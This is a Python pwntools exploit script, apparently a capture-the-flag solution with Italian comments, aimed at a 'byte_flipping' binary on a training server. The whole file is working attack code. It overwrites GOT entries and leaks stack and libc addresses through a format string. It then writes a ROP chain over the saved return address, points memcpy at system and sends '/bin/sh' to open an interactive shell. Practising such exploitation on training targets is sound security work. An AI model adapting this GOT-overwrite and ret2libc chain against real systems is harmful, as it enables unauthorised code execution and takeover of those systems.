from pwn import *
import time
import subprocess
import sys

def print_red(str):
	print("\033[91m" + str + "\033[0m")

def genbin(binary_name):
	command = f"genbin ~/challenges/playroom/shellcodes/{binary_name}"
	try:
		return bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
	except (subprocess.CalledProcessError, ValueError) as e:
		print(f"An exception occurred: {e}")
		exit(-1)

context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = "error"


if args["REMOTE"]:
    r = remote("bin.training.offdef.it", 4003)
else:
    r = process("./byte_flipping")

# address:  integer of the address you wanna write to
# data:     bytes object to be written
def write(address, data):
    for i in range(len(data)):
        r.sendline(hex(address + i).encode())
        time.sleep(0.2)
        r.sendline(hex(data[i]).encode())
        time.sleep(0.2)

# writes to an useless address a big value in order to trigger exit function in get_byte check
def send_big():
    r.sendline(b"e")
    time.sleep(0.2)
    r.sendline(b"0x100")
    time.sleep(0.2)    



flips = 0x602068
printf_plt = 0x400680
memcpy_got = 0x602038
exit_got = 0x602050
name_bss = 0x6020a0
pop_rdi_text = 0x400b33
pop_rsi_r15_text = 0x400b31
main_text = 0x4007c7
puts_got = 0x602018
memcpy_plt = 0x4006a6
start_text = 0x4006e0

# sostituisco dentro a exit indirizzo a main
time.sleep(0.5)
r.send(b"%p\n\x00")
time.sleep(0.2)
write(exit_got, bytes([0xc7, 0x07]))
send_big()

# rimpiazzo flips per scrivere quanto voglio
r.send(b"%p\n\x00")
time.sleep(0.2)
write(flips, bytes([0xff]))
send_big()

# sostituisco la funzione memcpy con la printf
r.send(b"%p\n\x00")
time.sleep(0.2)
write(memcpy_got, p64(printf_plt))
send_big()

# printo il leak e risostituisco di nuovo la memcpy
r.sendline(b"%p\n\x00")
time.sleep(0.2)
stack_leak = int(r.recvrepeatS(timeout=0.2).splitlines()[-2], 16)
print_red(hex(stack_leak))
sRIP_play = stack_leak - 0x58
write(memcpy_got, p64(memcpy_plt))
send_big()

# stampo il contenuto di puts dentro plt (leak_libc) e riavvio totalmente il programma (se riavvio da main crasha.. non si sa perchè)
# NB le modifiche a flips e al puntatore di exit non sono state modificate
r.sendline(b"%s\n\00")
time.sleep(0.2)
write(sRIP_play, p64(pop_rdi_text) + p64(name_bss) + p64(pop_rsi_r15_text) + p64(puts_got) + p64(0x00) + p64(printf_plt) + p64(start_text))
time.sleep(0.2)
r.sendline(b"0")
time.sleep(0.2)
libc_leak = int.from_bytes(r.recvrepeat(timeout=0.2).splitlines()[-6], byteorder="little")
print_red(hex(libc_leak))

libc_system = libc_leak - 0x30170

#sostituisco la memcpy con la system e riavvio
r.send(b"/bin/sh\x00")
time.sleep(0.2)
write(memcpy_got, p64(libc_system))
send_big()

r.send(b"/bin/sh\x00")
time.sleep(0.2)

r.interactive()
